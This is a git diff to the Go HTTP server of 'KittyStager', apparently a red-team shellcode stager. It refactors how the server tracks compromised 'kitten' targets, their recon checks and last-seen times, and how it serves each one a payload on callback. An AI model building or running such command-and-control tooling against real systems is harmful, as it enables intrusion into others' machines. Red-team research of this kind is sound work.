@@ -2,6 +2,7 @@ package http
 
 import (
 	"KittyStager/cmd/config"
+	"KittyStager/cmd/httpUtil"
 	"KittyStager/cmd/util"
 	b64 "encoding/base64"
 	"fmt"
@@ -10,61 +11,14 @@ import (
 	"time"
 )
 
-type kitten struct {
-	name       string
-	shellcode  []byte
-	id         int
-	lastSeen   string
-	InitChecks util.InitialChecks
-}
-
 var (
-	userA   string
-	Targets map[string]*kitten
+	userA    string
+	defSleep int
 )
 
-func (K *kitten) GetTarget() string {
-	return K.name
-}
-
-func (K *kitten) GetShellcode() []byte {
-	return K.shellcode
-}
-
-func (K *kitten) SetShellcode(sc []byte) {
-	K.shellcode = sc
-}
-
-func (K *kitten) GetId() int {
-	return K.id
-}
-
-func (K *kitten) SetId(id int) {
-	K.id = id
-}
-
-func (K *kitten) SetLastSeen(t string) {
-	K.lastSeen = t
-}
-
-func (K *kitten) GetLastSeen() string {
-	return K.lastSeen
-}
-
-func (K *kitten) GetInitChecks() util.InitialChecks {
-	return K.InitChecks
-}
-
-func (K *kitten) SetInitChecks(c util.InitialChecks) {
-	K.InitChecks = c
-}
-
 func CreateHttpServer(conf config.General) {
-	Targets = map[string]*kitten{"all targets": {
-		name:      "all targets",
-		shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
-		id:        len(Targets),
-	}}
+	httpUtil.Targets = make(map[string]*httpUtil.Kitten)
+	defSleep = conf.GetSleep()
 	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
 	userA = conf.GetUserAgent()
 	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
@@ -102,15 +56,17 @@ func logRequest(w http.ResponseWriter, r *http.Request) {
 		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
 		//Get recon data
 
-		Targets[c.KittenName] = &kitten{
-			name:       c.GetKittenName(),
-			id:         len(Targets),
-			lastSeen:   time.Now().Format("15:04:05"),
-			shellcode:  Targets["all targets"].GetShellcode(), //Set the shellcode to the default sleep time
+		httpUtil.Targets[c.KittenName] = &httpUtil.Kitten{
+			Name:       c.GetKittenName(),
+			Id:         len(httpUtil.Targets),
+			LastSeen:   time.Now(),
+			Payload:    []byte(fmt.Sprintf("%d", defSleep)),
+			Sleep:      defSleep,
+			Alive:      true,
 			InitChecks: c,
 		}
 
-		_, err = w.Write(Targets[c.GetKittenName()].GetShellcode())
+		_, err = w.Write(httpUtil.Targets[c.GetKittenName()].GetPayload())
 		if err != nil {
 			return
 		}
@@ -122,9 +78,9 @@ func logRequest(w http.ResponseWriter, r *http.Request) {
 		// regular callback
 	} else {
 		kittenName := cookie
-		if _, ok := Targets[kittenName]; ok {
-			_, err := w.Write(Targets[kittenName].GetShellcode())
-			Targets[kittenName].SetLastSeen(time.Now().Format("15:04:05"))
+		if _, ok := httpUtil.Targets[kittenName]; ok {
+			_, err := w.Write(httpUtil.Targets[kittenName].GetPayload())
+			httpUtil.Targets[kittenName].SetLastSeen(time.Now())
 			if err != nil {
 				return
 			}
